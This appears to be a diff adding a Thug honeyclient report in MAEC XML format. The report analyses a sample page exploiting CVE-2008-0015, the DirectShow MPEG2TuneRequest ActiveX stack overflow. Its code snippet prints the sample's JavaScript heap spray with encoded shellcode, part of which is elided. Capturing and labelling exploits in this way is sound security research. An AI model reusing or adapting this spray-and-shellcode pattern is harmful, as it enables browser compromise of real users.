@@ -1,0 +1,71 @@
+<MAEC_Bundle xmlns:ns1="http://xml/metadataSharing.xsd" xmlns="http://maec.mitre.org/XMLSchema/maec-core-1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://maec.mitre.org/XMLSchema/maec-core-1 file:MAEC_v1.1.xsd" id="maec:thug:bnd:1" schema_version="1.100000">
+    <Analyses>
+        <Analysis start_datetime="2012-12-11 21:01:55.261482" id="maec:thug:ana:2" analysis_method="Dynamic">
+            <Subject>
+                <Object object_name="http://127.0.0.1/thug/samples/./exploits/DirectShow.htm" type="URI" id="maec:thug:obj:3">
+                    <Associated_Code>
+                        <Associated_Code_Snippet>
+                            <Code_Snippet language="Javascript" id="maec:thug:cde:7">
+                                <Discovery_Method tool_id="maec:thug:tol:6" method="Dynamic Analysis"/>
+                                <Code_Segment>
+					
+					var appllaa='0';
+					var nndx='%'+'u9'+'0'+'9'+'0'+'%u'+'9'+'0'+'9'+appllaa;
+					var dashell=unescape(nndx+'%u5858%u5858%u10EB%u4B5B.....%uBDBD%u36EA%u9DFB%uA555%u4242%uE542%uEC7E%u36EB%u81C8%uC936%uC593%u48BE%u36EB%u9DCB%u48BE%u748E%uFCF4%uBE10%u8E78%uB266%uAD03%u6B87%uB5C9%u767C%uBEBA%uFD67%u4C56%uA286%u5AC8%u36E3%u99E3%u60BE%u36DB%uF6B1%uE336%uBEA1%u3660%u36B9%u78BE%uE316%u7EE4%u6055%u4241%u0F42%u5F4F%u8449%uC05F%u673E%uC6F5%u8F80%u2CC9%u38B1%u1262%uDE06%u6C34%uECF2%u07FD%u1DC2%u2AD8%uA376%uD919%u2E52%u598F%u3329%uB7AE%u7F11%uF6A4%u79BC%uA230%uEAC9%uB0DB%uFE42%u1103%uC066%u184D%uEF27%u1A43%u8367%u0BA0%u0584%u69D4%u03A6%uDBC2%u411D%u8A14%u2510%uADB7%u3D45%u126B%u4627%uA8EE%uD5DB%uc9c9%u87cd%u9292%ud4d0%ud1d1%ud6d1%ude93%ud0d2%uca92%u92d0%ucbce%ud5de%uced2%u93c9%uc5d8%ubdd8%ubdBD%uBDBD%uBDBD%uBDBD%uBDBD%uBDBD%uBDBD%uEAEA'); // xor:0BD
+					var headersize=20;
+					var omybro=unescape(nndx);
+					var slackspace=headersize+dashell.length;
+					while(omybro.length&lt;slackspace)
+					omybro+=omybro;
+					bZmybr=omybro.substring(0,slackspace);
+					shuishiMVP=omybro.substring(0,omybro.length-slackspace);
+					while(shuishiMVP.length+slackspace&lt;0x100)  
+					shuishiMVP=shuishiMVP+shuishiMVP+bZmybr;
+					memory=new Array();
+					for(x=0;x&lt;300;x++)
+					memory[x]=shuishiMVP+dashell;
+					//var myObject=document.createElement('object');
+					//myObject.appendChild(myObject);
+					myObject.width='1';
+					myObject.height='1';
+					myObject.data='./logo.gif'; 
+				</Code_Segment>
+                            </Code_Snippet>
+                            <Nature_Of_Relationship>Contained_Inside</Nature_Of_Relationship>
+                        </Associated_Code_Snippet>
+                    </Associated_Code>
+                    <Internet_Object_Attributes>
+                        <URI>http://127.0.0.1/thug/samples/./exploits/DirectShow.htm</URI>
+                    </Internet_Object_Attributes>
+                </Object>
+            </Subject>
+            <Tools_Used>
+                <Tool id="maec:thug:tol:1">
+                    <Name>Thug</Name>
+                    <Version>0.4.9</Version>
+                    <Organization>The Honeynet Project</Organization>
+                </Tool>
+            </Tools_Used>
+        </Analysis>
+    </Analyses>
+    <Behaviors>
+        <Behavior id="maec:thug:bhv:4">
+            <Description>
+                <Text>[HTTP] URL: http://127.0.0.1/thug/samples/./exploits/DirectShow.htm (Status: 200, Referrer: None)</Text>
+            </Description>
+            <Discovery_Method tool_id="maec:thug:tol:5" method="Dynamic Analysis"/>
+        </Behavior>
+        <Behavior id="maec:thug:bhv:8">
+            <Purpose>
+                <Attempted_Vulnerability_Exploit vulnerability_type="Known">
+                    <Known_Exploit cve_id="CVE-2008-0015"/>
+                </Attempted_Vulnerability_Exploit>
+            </Purpose>
+            <Description>
+                <Text>[Microsoft DirectShow MPEG2TuneRequest ActiveX] Stack Overflow in data property</Text>
+            </Description>
+            <Discovery_Method tool_id="maec:thug:tol:9" method="Dynamic Analysis"/>
+        </Behavior>
+    </Behaviors>
+    <Pools/>
+</MAEC_Bundle>
